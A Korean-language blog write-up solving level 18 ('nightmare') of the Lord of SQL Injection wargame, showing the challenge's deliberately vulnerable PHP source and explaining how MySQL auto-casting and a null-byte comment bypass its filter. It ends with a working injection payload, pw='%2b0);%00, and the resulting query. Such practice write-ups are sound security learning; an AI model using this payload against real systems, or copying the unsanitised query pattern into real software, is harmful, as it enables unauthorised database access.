---
title: Lord of SQL Injection Write Up No.18 Nightmare
date: 2019-09-08 22:19:09
updated:
categories:
  - Write Up
tags:
  - Lord of SQL Injection
  - Infosec
---

## 개요

{% img /image/los-main.png 300 %}

SQL Injection에 대한 지식을 쌓기 위해 [Lord of SQL Injection 사이트](https://los.eagle-jump.org/)의 문제를 풀고 해답을 정리한다.

이 문서에서는 Lord of SQL Injection 18번 nightmare 문제에 대하여 정리한다.

<!-- more -->

## 문제 분석

### 문제 출제 의도

주석 필터링을 우회하고 MySQL Auto Casting을 이용하여 SQL Injection을 할 수 있는지 확인한다.

### 필요 배경 지식

#### MySQL Type Conversion, Auto Casting

- MySQL에도 기타 프로그래밍 언어처럼 형 변환이 존재한다.
- 그 중 문자열 관련 자료형이 숫자 자료형으로 변환되는 경우 문자열에서 문자가 나오기 전에 나오는 숫자만 변환되고 만약 문자가 가장 먼저 나오면 0으로 변환된다.
- MySQL의 Type Conversion에 대해 잘 모르겠다면 다음 링크를 참고하자.
- [MySQL :: MySQL 5.7 Reference Manual :: 12.2 Type Conversion in Expression Evaluation](https://dev.mysql.com/doc/refman/5.7/en/type-conversion.html)

#### MySQL 주석

- MySQL에서 사용될 수 있는 주석에는 `#`, `--%20` 뿐만 아니라 `;%00`, `/*` 등도 있다.

### 소스 코드 분석

nightmare 문제의 php 소스 코드는 다음과 같다.

```php
<?php
  include "./config.php";
  login_chk();
  dbconnect();
  if(preg_match('/prob|_|\.|\(\)|#|-/i', $_GET[pw])) exit("No Hack ~_~");
  if(strlen($_GET[pw])>6) exit("No Hack ~_~");
  $query = "select id from prob_nightmare where pw=('{$_GET[pw]}') and id!='admin'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysql_fetch_array(mysql_query($query));
  if($result['id']) solve("nightmare");
  highlight_file(__FILE__);
?>
```

#### Filter

```php
  if(preg_match('/prob|_|\.|\(\)|#|-/i', $_GET[pw])) exit("No Hack ~_~");
  if(strlen($_GET[pw])>6) exit("No Hack ~_~");
```

- GET 방식으로 `pw`를 받고, `pw`에 `prob`, `_`, `.`, `()`, `#`, `-` 가 들어 있으면 `No Hack ~_~`이 뜨고 문제 풀이에 실패한다.
- 또한, 받은 `pw`의 길이가 6 이상이면 `No Hack ~_~`가 뜨고 문제 풀이에 실패한다.

#### Query

```php
  $query = "select id from prob_nightmare where pw=('{$_GET[pw]}') and id!='admin'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysql_fetch_array(mysql_query($query));
  if($result['id']) solve("nightmare");
```

- 받은 `id`가 직접 쿼리에 들어간다. 이것으로 SQL Injection 공격이 가능하다는 것을 알 수 있다.
- 문제 풀이가 성공하는 조건은 '데이터베이스에서 받은 `id`에 참이 되는 어떤 문자열이든 들어있음'이다.

## Solution

1. MySQL Auto Casting, 주석 우회 이용

   MySQL에서 문자열과 숫자를 연산하면 숫자 자료형으로 Auto Casting이 일어난다.
   이때, 문자가 숫자로 시작하지 않으면 `0`으로 변환되게 된다.

   이를 이용하여, 문자로 시작하는 모든 `pw`를 가져오는 WHERE절을 구성할 수 있다.
   `%2b`는 `+`이다.

   ```url
   http://los.eagle-jump.org/nightmare_ce407ee88ba848c2bec8e42aaeaa6ad4.php?pw='%2b0);%00
   ```

   ```sql
   select id from prob_nightmare where pw=(''+0);') and id!='admin'
   ```
